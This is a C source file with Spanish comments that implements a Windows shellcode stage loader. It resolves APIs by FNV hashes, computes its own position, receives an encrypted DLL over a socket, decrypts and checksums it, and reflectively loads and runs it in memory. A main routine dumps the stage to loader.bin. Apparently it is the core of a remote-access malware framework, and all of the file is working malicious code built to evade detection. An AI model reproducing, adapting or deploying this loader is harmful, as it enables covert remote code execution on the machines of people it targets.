#include "..\kPreprocessor\kPreprocessor.h"
#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include "main.h"

DEFINE_PYSRC(
def DEFINE_SHELLCODE_STR(a):
    r = ""
    for s in a:
        r+= ("char s%s[] = {")%(s)
        for c in s:
            r+=("'%s',")%(c)
        r+= "'\\0'};\n"
    return r

def FNV(s):
    h = 2166136261
    for c in s:
        h^= ord(c)
        h*= 16777619
        h&= 0xFFFFFFFF

    return h
)DEFINE_END()

#define DEFINE_SHELLCODE_STR(...) PYTHON_FUNCTION()
#define FNV(...) PYTHON_FUNCTION()

int main(int argc, char **argv);
void scInit(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY);
void Start(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY);
void Payload(PSHELLCODE_CONTEXT scc);

void __declspec(naked) Start(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY){
    __asm{
        jmp scInit
    }
}

#pragma region LibThings

void *MyRealloc(PSHELLCODE_CONTEXT pSCC, void *ptr, size_t size){
    //Funcion para relocalizar o localizar el array de modules
	if (NULL == ptr)
		return pSCC->RtlAllocateHeap_(pSCC->GetProcessHeap_(), 0, size);
	else
		return pSCC->RtlReAllocateHeap_(pSCC->GetProcessHeap_(), 0, ptr, size);
}

void CopySections(PSHELLCODE_CONTEXT pSCC, const unsigned char *data, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module){
	int i, size;
	unsigned char *codeBase = module->codeBase;
	unsigned char *dest;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);

    //Recorremos cada seccion
	for (i=0; i<module->headers->FileHeader.NumberOfSections; i++, section++){
        //Aunque no tenga datos inicializados hay que crear sitio en memoria...
		if (section->SizeOfRawData == 0){
			size = old_headers->OptionalHeader.SectionAlignment;
            //... solo si hubiese que alinear
			if (size > 0){
				dest = (unsigned char *)pSCC->VirtualAlloc_(codeBase + section->VirtualAddress, size, MEM_COMMIT, PAGE_READWRITE);
				section->Misc.PhysicalAddress = (DWORD)dest;
                //Nos aseguramos que quede a 0s
				pSCC->memset_(dest, 0, size);
			}
            //Siguiente seccion
			continue;
		}

		// Creamos bloque de memoria y copiamos los valores
		dest = (unsigned char *)pSCC->VirtualAlloc_(codeBase + section->VirtualAddress, section->SizeOfRawData, MEM_COMMIT, PAGE_READWRITE);
		pSCC->memcpy_(dest, data + section->PointerToRawData, section->SizeOfRawData);
        //Guardamos la direccion
		section->Misc.PhysicalAddress = (DWORD)dest;
	}
}

//Protegemos las paginas de memoria segun corresponda
void FinalizeSections(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
	int i;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);
	int ProtectionFlags[2][2][2] = {
		{
			//No ejecutable
			{PAGE_NOACCESS, PAGE_WRITECOPY},
			{PAGE_READONLY, PAGE_READWRITE},
		}, {
			//Ejecutable
			{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},
			{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE},
		},
	};

	
	//Recorremos las secciones
	for (i=0; i<module->headers->FileHeader.NumberOfSections; i++, section++){
		DWORD protect, oldProtect, size;
		BOOL executable = ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0);
		BOOL readable   = ((section->Characteristics & IMAGE_SCN_MEM_READ) != 0);
		BOOL writeable  = ((section->Characteristics & IMAGE_SCN_MEM_WRITE) != 0);

        //Si la memoria no se necesita la liberamos libremente
		if (section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE){
			pSCC->VirtualFree_((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, MEM_DECOMMIT);
			continue;
		}

		//Determinamos el tipo de proteccion
		protect = ProtectionFlags[executable][readable][writeable];
		if (section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
			protect |= PAGE_NOCACHE;

		//Obtenemos el tamaño de la seccion en disco
		size = section->SizeOfRawData;
        //Si el tamaño es cero tal vez...
		if (size == 0){
            //... se trata de data inicializada
			if (section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
				size = module->headers->OptionalHeader.SizeOfInitializedData;
            //... o no
			else if (section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
				size = module->headers->OptionalHeader.SizeOfUninitializedData;
		}

        //Ahora cambiamos el acceso
		if (size > 0)
			pSCC->VirtualProtect_((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, protect, &oldProtect);
	}
}

void PerformBaseRelocation(PMEMORYMODULE module, int delta){
	unsigned char *codeBase = module->codeBase;

	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    //Comprobamos si hay reloc
	if (directory->Size > 0){
        //Obtenemos el dir
		PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(codeBase + directory->VirtualAddress);

        //Mientras haya bloque de relocalizacion
		while(relocation->VirtualAddress > 0){
            //Obtenemos el puntero absoluto
			unsigned char *dest = (unsigned char *)(codeBase + relocation->VirtualAddress);
			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + sizeof(IMAGE_BASE_RELOCATION));

			for (UINT i=0; i<((relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); i++, relInfo++){
				//Los 4 bits superiores establecen el tipo de relocalizacion
				int type = *relInfo >> 12;
				//y los 12 inferiores el offset
				int offset = *relInfo & 0xfff;

				switch(type){
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(short*)((char*)dest + offset) += HIWORD(delta);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(short*)((char*)dest + offset) += LOWORD(delta);
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(int*)((char*)dest + offset) += delta;
                    break;
                }
			}

			//Siguiente bloque
			relocation = (PIMAGE_BASE_RELOCATION)(((DWORD)relocation) + relocation->SizeOfBlock);
		}
	}
}

//Rellenamos la IAT
BOOL BuildImportTable(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
	unsigned char *codeBase = module->codeBase;

    //Comprobamos que haya import
	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (directory->Size > 0){
        //Cargamos el dir
		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory->VirtualAddress);
        //Mientras podamos leer el nombre de la DLL y el descriptor...
		while(!pSCC->IsBadReadPtr_(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name){
			DWORD *thunkRef, *funcRef;
            //Cargamos la DLL
			HMODULE handle = pSCC->LoadLibraryA_((LPCSTR)(codeBase + importDesc->Name));
            //Si no hemos podido cargar la DLL salimos
			if (handle == INVALID_HANDLE_VALUE)
				return false;
            //Añadimos el handle a nuestro array
			module->modules = (HMODULE *)MyRealloc(pSCC, module->modules, (module->numModules+1)*(sizeof(HMODULE)));
            //Si no hemos podido crear hueco para el handle
			if (module->modules == NULL)
			    return false;
            //Guardamos el handle
			module->modules[module->numModules++] = handle;

			if (importDesc->OriginalFirstThunk){
				thunkRef = (DWORD *)(codeBase + importDesc->OriginalFirstThunk);
				funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
			}else{
				//Si no hay hint table ambos son el mismo
				thunkRef = (DWORD *)(codeBase + importDesc->FirstThunk);
				funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
			}
            //Mientras tengamos un thunk que leer...
			while(*thunkRef){
				if IMAGE_SNAP_BY_ORDINAL(*thunkRef){
                    //Si se trata de un ordinal
					*funcRef = (DWORD)pSCC->GetProcAddressA_(handle, (LPCSTR)*thunkRef);
                }else{
                    //Si no es un ordinal cargamos por nombre
					PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);
					*funcRef = (DWORD)pSCC->GetProcAddressA_(handle, (LPCSTR)&thunkData->Name);
				}
                //Si no hemos podido sacar el puntero salimos
				if (*funcRef == 0)
					return false;

                //Siguientes bloques
                thunkRef++;
                funcRef++;
			}
            //Siguiente descriptor
            importDesc++;
		}
	}
    //Todo correcto
	return true;
}

void NotifyTls(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module, bool State){
    PIMAGE_DATA_DIRECTORY tls_dd    = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_TLS);
    DWORD tls_index;
    PBYTE buffer;

    //Si existe un directorio de TLS...
    if (tls_dd->Size > 0){
        PIMAGE_TLS_DIRECTORY tls_dir= (PIMAGE_TLS_DIRECTORY)(tls_dd->VirtualAddress + module->codeBase);
        if(State == true){
            //Definimos un indice
            tls_index = pSCC->TlsAlloc_();
            *((DWORD*)(tls_dir->AddressOfIndex)) = tls_index;
            //Hacemos sitio en memoria
            buffer = (PBYTE)pSCC->malloc__(tls_dir->EndAddressOfRawData - tls_dir->StartAddressOfRawData);

            //Copiamos el TLS al buffer
            pSCC->memcpy_(buffer, (PDWORD)tls_dir->StartAddressOfRawData, tls_dir->EndAddressOfRawData-tls_dir->StartAddressOfRawData);
            //Asignamos el puntero
            pSCC->TlsSetValue_(tls_index, buffer);
        }

        //Notificamos a los callbacks
        PIMAGE_TLS_CALLBACK *tls_cb = (PIMAGE_TLS_CALLBACK*)tls_dir->AddressOfCallBacks;
        while(*tls_cb){
            (*tls_cb)(module->codeBase, (DWORD)State, 0);
            tls_cb++;
        }

        if(State == false){
            //Leemos el indice
            tls_index = *((DWORD*)tls_dir->AddressOfIndex);
            //Limpiamos memoria
            pSCC->free_(pSCC->TlsGetValue_(tls_index));
            //Liberamos el indice
            pSCC->TlsFree_(tls_index);
        }
    }
}

void AddToModules(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module, LPCWSTR name){
    //Creamos la estructura
    module->ldr_mod = (PLDR_MODULE)pSCC->malloc__(sizeof(LDR_MODULE));

    //Asignamos valores generales
    module->ldr_mod->TlsIndex  = (WORD)pSCC->TlsAlloc_();
    module->ldr_mod->DllBase = module->codeBase;
    module->ldr_mod->SizeOfImage = module->headers->OptionalHeader.SizeOfImage;
    module->ldr_mod->EntryPoint = (PVOID)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
    module->ldr_mod->LoadCount = 1;
    module->ldr_mod->SectionPointer = (PVOID)-1;
    module->ldr_mod->CheckSum = module->headers->OptionalHeader.CheckSum;
    module->ldr_mod->TimeDateStamp = module->headers->FileHeader.TimeDateStamp;
    module->ldr_mod->Flags = LDR_WINE_INTERNAL | LDR_ENTRY_PROCESSED | LDR_LOAD_IN_PROGRESS;

    USHORT name_size = 0;
    //Calculamos el tamaño del nombre
    while(name[++name_size]!=0){}

    //Añadimos el nombre de la DLL
    module->ldr_mod->FullDllName.Length = name_size;
    module->ldr_mod->FullDllName.MaximumLength = name_size;
    module->ldr_mod->FullDllName.Buffer = (PWSTR)name;
    module->ldr_mod->BaseDllName.Length = name_size;
    module->ldr_mod->BaseDllName.MaximumLength = name_size;
    module->ldr_mod->BaseDllName.Buffer = (PWSTR)name;

    //Añadimos nuestro modulo a la cadena de modulos cargados
    PPEB_LDR_DATA   ldr_data;
    PLIST_ENTRY     prev, last;

    //Obtenemos PEB_LDR_DATA
    __asm{
        xor eax, eax
        mov eax, FS:[eax+0x30]
        mov eax, [eax+0x0C]
        mov [ldr_data], eax
    }

    //Linkeamos nuestro LDR_MODULE
    last = ldr_data->InLoadOrderModuleList.Flink;
    prev = last->Blink;
    last->Blink = (PLIST_ENTRY)module->ldr_mod;
    prev->Flink = (PLIST_ENTRY)module->ldr_mod;
    module->ldr_mod->InLoadOrderLinks.Blink = prev;
    module->ldr_mod->InLoadOrderLinks.Flink = last;
}

int __stdcall LoadLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, const void *data, LPCWSTR dllname, PMEMORYMODULE result){
	PIMAGE_DOS_HEADER   dos_header;
	PIMAGE_NT_HEADERS   old_header;
	unsigned char       *code;
    unsigned char       *headers;
	DWORD               locationDelta;
	DllEntryProc        DllEntry;
	BOOL                successfull;


	dos_header = (PIMAGE_DOS_HEADER)data;
	old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(data))[dos_header->e_lfanew];
	code = (unsigned char *)pSCC->VirtualAlloc_((LPVOID)(old_header->OptionalHeader.ImageBase), old_header->OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);
	
    //Si no podemos reservar memoria en el puntero que indica el PE...
	if (code == NULL)
		//... lo intentamos en una posicion arbitraria
		code = (unsigned char *)pSCC->VirtualAlloc_(NULL, old_header->OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);
    //... si aun asi no conseguimos memoria...
	if (code == NULL)
        //...salimos
		return NULL;

    //Asignamos parte de informacion a nuestra estructura
	result->codeBase = code;
	result->numModules = 0;
	result->modules = NULL;

	//Hacemos commit de la memoria
	pSCC->VirtualAlloc_(code, old_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);

	//Obtenemos bloque de memoria para los headers
	headers = (unsigned char *)pSCC->VirtualAlloc_(code, old_header->OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE);
	
	//Copiamos el header
	pSCC->memcpy_(headers, dos_header, dos_header->e_lfanew + old_header->OptionalHeader.SizeOfHeaders);
    //Almacemos los headers en nuestra estructura
	result->headers = (PIMAGE_NT_HEADERS)&((const unsigned char *)(headers))[dos_header->e_lfanew];

	//Actualizamos el ImageBase del PE
	result->headers->OptionalHeader.ImageBase = (DWORD)code;

	//Copiamos las secciones
	CopySections(pSCC, (const unsigned char *)data, old_header, result);

    // Añadimos la DLL a la lista de módulos
    //AddToModules(pSCC, result, dllname);

	//Obtenemos el Delta para el reloc
	if ((locationDelta = (DWORD)(code - old_header->OptionalHeader.ImageBase)) != 0)
        //Si es distinto a 0 vemos si hay que aplicar reloc
		PerformBaseRelocation(result, locationDelta);

	//Cargamos los imports
	if (!BuildImportTable(pSCC, result))
        //Si ha habido algun problema mejor salir
		return NULL;

	//Asignamos permisos y eliminamos secciones de ser necesario
	FinalizeSections(pSCC, result);

    //Cargamos y notificamos a los TLS
    NotifyTls(pSCC, result, true);

	//Obtenemos el EP
	if (result->headers->OptionalHeader.AddressOfEntryPoint != 0){
        //Obtenemos la direccion absoluta
		DllEntry = (DllEntryProc)(code + result->headers->OptionalHeader.AddressOfEntryPoint);

		//Notificamos la carga
		successfull = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);
		if (!successfull)
			return NULL;
	}

	return 1;
}

void __stdcall FreeLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
    //Notificamos que vamos a descargar la libreria
    if (module->headers->OptionalHeader.AddressOfEntryPoint != 0){
        DllEntryProc DllEntry = (DllEntryProc)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
	    if (DllEntry != 0)
	        (*DllEntry)((HINSTANCE)(module->codeBase), DLL_PROCESS_DETACH, 0);
    }

    //Notificamos y descargamos los Tls
    NotifyTls(pSCC, module, false);

    //Desvinculamos el modulo
	/*
    PLIST_ENTRY next, prev;
    pSCC->TlsFree_(module->ldr_mod->TlsIndex);
    next = ((PLIST_ENTRY)module->ldr_mod)->Flink;
    prev = ((PLIST_ENTRY)module->ldr_mod)->Blink;
    next->Blink = prev;
    prev->Flink = next;
	*/
    //Liberamos la memoria
    pSCC->VirtualFree_(module->codeBase, 0, MEM_RELEASE);

    //Liberamos cada DLL cargada
    for(int i=0; i<module->numModules;i++)
        pSCC->FreeLibrary_(module->modules[i]);

    //Liberamos el array de modules
    pSCC->RtlFreeHeap_(pSCC->GetProcessHeap_(), 0, module->modules);
}

#pragma endregion

ULONG fnv32(register const char *s){
    register ULONG hash = 2166136261U;
 
    while(*s)
        hash = (hash ^ (*(s++)))*16777619;
 
    return hash;
}

bool mystrcmp(const char *s1, const char *s2){
	register int ret = 0;
	while (!(ret = *(unsigned char *)s1 - *(unsigned char *)s2) && *s2) ++s1, ++s2;
	return (ret == 0);
}

_LoadLibraryA __declspec(naked) GetLoadLib(){
	__asm{
		mov eax, 0xDEADBEEF
		ret
	}
}

FARPROC WINAPI GetProcAddressReplacement(HINSTANCE hModule, LPCSTR lpProcName){
    FARPROC proc = NULL;

    if(*((USHORT*)hModule)==IMAGE_DOS_SIGNATURE){
        PIMAGE_NT_HEADERS PE = (PIMAGE_NT_HEADERS)(((IMAGE_DOS_HEADER*)hModule)->e_lfanew+(ULONG)hModule);
        if(PE->Signature == IMAGE_NT_SIGNATURE && PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size){
            register PIMAGE_EXPORT_DIRECTORY ExpDir = (PIMAGE_EXPORT_DIRECTORY)(PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+(ULONG)hModule);
			ULONG* functionRVAs = (ULONG*)(ExpDir->AddressOfFunctions+(ULONG)hModule);
			USHORT* ordinalRVAs = (USHORT*)(ExpDir->AddressOfNameOrdinals+(ULONG)hModule);
			if IMAGE_SNAP_BY_ORDINAL((DWORD)lpProcName){
				WORD  ord = LOWORD(lpProcName);
				DWORD ord_base = ExpDir->Base;
				
				if (ord < ord_base || ord > ord_base + ExpDir->NumberOfFunctions)
					return NULL;
				
				proc = (FARPROC)((char*)hModule + functionRVAs[ord - ord_base]);
			}else{
				register char** ExportNames = (char**)(ExpDir->AddressOfNames+(ULONG)hModule);
				register int i;
				for(i = 0;ExportNames[i];i++){
					if(mystrcmp(ExportNames[i]+(ULONG)hModule, lpProcName) == true){
						proc = (FARPROC)(functionRVAs[ordinalRVAs[i]] + (ULONG)hModule);
						break;
					}
				}
			}
			if ((char*)proc >= (char*)ExpDir &&
				(char*)proc < (char*)ExpDir + PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size){

					register char dll_name[64];
					register ULONG size = 0;
					register char* f_name;

					while(*((char*)proc + size) >= '.' && *((char*)proc + size) <= 'z'){
						if (*((char*)proc+size) == '.')
							f_name = dll_name + size;
						dll_name[size++] = *((char*)proc+size);
					}
					dll_name[size] = '\0';
					*f_name++ = '\0';

					HMODULE new_mod = GetLoadLib()(dll_name);
					if (new_mod)
						proc = GetProcAddressReplacement(new_mod, (LPCSTR)f_name);
			}
        }
    }
    return proc;
}

FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule, ULONG hash){
    register PIMAGE_NT_HEADERS PE;
    register FARPROC proc = NULL;
    register PIMAGE_EXPORT_DIRECTORY ExpDir = NULL;
    register char** ExportNames = NULL;
 
    if(*((USHORT*)hModule)==IMAGE_DOS_SIGNATURE){
        PE = (PIMAGE_NT_HEADERS)(((IMAGE_DOS_HEADER*)hModule)->e_lfanew+(ULONG)hModule);
        if(PE->Signature == IMAGE_NT_SIGNATURE && PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size){
            ExpDir = (PIMAGE_EXPORT_DIRECTORY)(PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+(ULONG)hModule);
            ExportNames = (char**)(ExpDir->AddressOfNames+(ULONG)hModule);
            register int i;
            for(i = 0;ExportNames[i];i++){
                if(fnv32(ExportNames[i]+(ULONG)hModule) == hash){
                    ULONG* functionRVAs = (ULONG*)(ExpDir->AddressOfFunctions+(ULONG)hModule);
                    USHORT* ordinalRVAs = (USHORT*)(ExpDir->AddressOfNameOrdinals+(ULONG)hModule);
                    proc = (FARPROC)(functionRVAs[ordinalRVAs[i]] +(ULONG)hModule);
                    break;
                }
            }
 
        }
    }
    return proc;
}

void Payload(PSHELLCODE_CONTEXT scc){
    bool  bReceived = false;
    char* bBuff     = 0;
    DWORD dwSize    = 0;
    DWORD dwDSize   = 15;
    //Generamos el OK
    char ok[16]     = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
    scc->CryptEncrypt_(scc->hKey, 0, true, 0, (BYTE*)ok, &dwDSize, sizeof(ok));

    //Enviamos el OK al cliente.
    if (scc->send_(scc->hSocket, ok, sizeof(ok), 0) == sizeof(ok)){
        //Recibimos el tamaño del PluginManager
        if ((scc->recv_(scc->hSocket, (char*)&dwSize, sizeof(DWORD), 0) == 4)&&(dwSize > 0)){   //Si lo que hemos recibido es un DWORD y nos han aceptado el OK...
            //Hacemos sitio para almacenar el PluginManager
            bBuff = (char*)scc->malloc__(dwSize);
            if (bBuff > 0){
                DWORD dwASize   = dwSize;
                DWORD lResult   = 0;

                //Recibimos el PluginManager
                bReceived = true;
                while ((dwASize > 0) && (bReceived==true)){
                    lResult = scc->recv_(scc->hSocket, (char*)(bBuff+(dwSize-dwASize)), dwASize, 0);
                    dwASize -= lResult;
                    if(lResult <= 0)
                        bReceived = false;
                }
                dwDSize = dwSize;
            }
        }
    }else{
        DWORD last_err = ERROR_SUCCESS;
        __asm{
            xor eax, eax                    //EAX = 0
            mov eax, DWORD PTR FS:[eax+0x34]//v
            mov [last_err], eax             //> last_err = GetLastError()
        }
        if (last_err == WSAENOTCONN){
            //TO DO: LEER PLUGINMANAGER ADHERIDO
            bBuff = (char*)(scc->delta + (PBYTE)main);
            dwDSize = *(DWORD*)((PBYTE)bBuff - 4);
            dwSize = dwDSize;
            bReceived = true;
        }else{
            return;
        }
    }

    //Lo desciframos
    if ((bReceived==true)&&(scc->CryptDecrypt_(scc->hKey, 0, true, 0, (BYTE*)bBuff, &dwDSize) == 1)){
        //Procedemos a comprobar el Checksum
        DWORD oChecksum = *(DWORD*)bBuff;
        //Saltamos el Checksum de los datos recibidos
        bBuff += 4;
        DWORD nChecksum = 0;

        for(DWORD i = 0; i < dwSize-4;i++){
            nChecksum ^= (BYTE)bBuff[i];
            nChecksum *= 0x1EF30EB;
        }

        //Si el checksum coincide
        if (nChecksum == oChecksum){
            //Cargamos y ejecutamos el PluginManager
            WCHAR sDLLName[]    = {'p', 'm', '.', 'd', 'l', 'l', '\0'};
            char sPMEntry[]     = {'_', 'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '4', '\0'};

            PMEMORYMODULE PM_Mod = (PMEMORYMODULE)scc->RtlAllocateHeap_(scc->GetProcessHeap_(), 0, sizeof(MEMORYMODULE));;
            //Si hemos podido cargar el PM...
            if ((LoadLibraryFromMemory(scc, bBuff, sDLLName, PM_Mod))){
                InitPluginLoader MainFunc = (InitPluginLoader)scc->GetProcAddressA_((HMODULE)PM_Mod->codeBase, sPMEntry);
                if (MainFunc){
                    scc->FLFM   = /*(FreeLibraryFromMemory_)*/((PBYTE)FreeLibraryFromMemory + scc->delta);
                    scc->LLFM   = /*(LoadLibraryFromMemory_)*/((PBYTE)LoadLibraryFromMemory + scc->delta);
                    //y ejecutamos el Main
                    MainFunc(scc);
                }
                //Si el PM nos retorna la ejecución descargamos la DLL de memoria
                FreeLibraryFromMemory(scc, PM_Mod);
                //y la estructura
                scc->RtlFreeHeap_(scc->GetProcessHeap_(), 0, PM_Mod);
            }
        }
        bBuff-= 4;
    }
    //eliminamos el buffer
    scc->free_(bBuff);
    return;
}

void scInit(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY){
    DEFINE_SHELLCODE_STR(["MSVCRT", "NTDLL", "KERNEL32", "WS2_32", "ADVAPI32"])

    PSHELLCODE_CONTEXT  scc = (SHELLCODE_CONTEXT*)((_malloc)GetProcAddressByHash(pLoadLibA(sMSVCRT), FNV("malloc")))(sizeof(SHELLCODE_CONTEXT));

    register DWORD d=0;
    __asm{
        call get_delta
get_delta:
        pop  eax
        sub  eax, get_delta
        mov  d, eax
    }

    scc->delta = d;
	//Parcheamos GetLoadLib() para que devuelva el puntero (A modo de variable global)
	*(PDWORD)((PBYTE)GetLoadLib + 1 + scc->delta) = (DWORD)pLoadLibA;

    scc->NTDLL              = pLoadLibA(sNTDLL);
    scc->memcpy_            = (_memcpy)GetProcAddressByHash(scc->NTDLL, FNV("memcpy"));
    scc->memset_            = (_memset)GetProcAddressByHash(scc->NTDLL, FNV("memset"));
    scc->RtlAllocateHeap_   = (_RtlAllocateHeap)GetProcAddressByHash(scc->NTDLL, FNV("RtlAllocateHeap"));
    scc->RtlReAllocateHeap_ = (_RtlReAllocateHeap)GetProcAddressByHash(scc->NTDLL, FNV("RtlReAllocateHeap"));
    scc->RtlFreeHeap_       = (_RtlFreeHeap)GetProcAddressByHash(scc->NTDLL, FNV("RtlFreeHeap"));

    scc->KERNEL32           = pLoadLibA(sKERNEL32);
    scc->FreeLibrary_       = (_FreeLibrary)GetProcAddressByHash(scc->KERNEL32, FNV("FreeLibrary"));
    scc->VirtualAlloc_      = (_VirtualAlloc)GetProcAddressByHash(scc->KERNEL32, FNV("VirtualAlloc"));
    scc->VirtualFree_       = (_VirtualFree)GetProcAddressByHash(scc->KERNEL32, FNV("VirtualFree"));
    scc->VirtualProtect_    = (_VirtualProtect)GetProcAddressByHash(scc->KERNEL32, FNV("VirtualProtect"));
    scc->GetProcessHeap_    = (_GetProcessHeap)GetProcAddressByHash(scc->KERNEL32, FNV("GetProcessHeap"));
    scc->IsBadReadPtr_      = (_IsBadReadPtr)GetProcAddressByHash(scc->KERNEL32, FNV("IsBadReadPtr"));
    scc->TlsAlloc_          = (_TlsAlloc)GetProcAddressByHash(scc->KERNEL32, FNV("TlsAlloc"));
    scc->TlsFree_           = (_TlsFree)GetProcAddressByHash(scc->KERNEL32, FNV("TlsFree"));
    scc->TlsSetValue_       = (_TlsSetValue)GetProcAddressByHash(scc->KERNEL32, FNV("TlsSetValue"));
    scc->TlsGetValue_       = (_TlsGetValue)GetProcAddressByHash(scc->KERNEL32, FNV("TlsGetValue"));

    scc->WS2_32             = pLoadLibA(sWS2_32);
    scc->send_              = (_send)GetProcAddressByHash(scc->WS2_32, FNV("send"));
    scc->recv_              = (_recv)GetProcAddressByHash(scc->WS2_32, FNV("recv"));
    scc->ADVAPI32           = pLoadLibA(sADVAPI32);
    scc->CryptDecrypt_      = (_CryptDecrypt)GetProcAddressByHash(scc->ADVAPI32, FNV("CryptDecrypt"));
    scc->CryptEncrypt_      = (_CryptEncrypt)GetProcAddressByHash(scc->ADVAPI32, FNV("CryptEncrypt"));

    scc->MSVCRT             = pLoadLibA(sMSVCRT);
    scc->malloc__           = (_malloc)GetProcAddressByHash(scc->MSVCRT, FNV("malloc"));
    scc->free_              = (_free)GetProcAddressByHash(scc->MSVCRT, FNV("free"));

    scc->LoadLibraryA_      = pLoadLibA;
	scc->GetProcAddressA_   = (_GetProcAddress)((PBYTE)GetProcAddressReplacement+scc->delta);
    scc->hSocket            = hSocket;
    scc->hKey               = hKEY;

    Payload(scc);
    scc->free_(scc);
    
    __asm{
        leave 
        ret 0xC
    }
    //return;
}

//Valor escrito por el PM en caso de haber sido guardado offline
//Éste establece el tamaño del PM
void __declspec(naked) PM_SIZE(){
    __asm __emit 0x0;__emit 0x0;__emit 0x0;__emit 0x0;
}

//Código utilizado para generar ".bin" y debuggear la shellcode
int main(int argc, char **argv){
    FILE *pfBin;
    size_t dwSize;
    char szBinFile[MAX_PATH];

    dwSize = (PBYTE)main - (PBYTE)Start;

	sprintf_s(szBinFile, MAX_PATH, "loader.bin");
    
    fopen_s(&pfBin, szBinFile, "wb");
    fwrite((PBYTE)Start, dwSize, 1, pfBin);
    fclose(pfBin);

    return 0;
}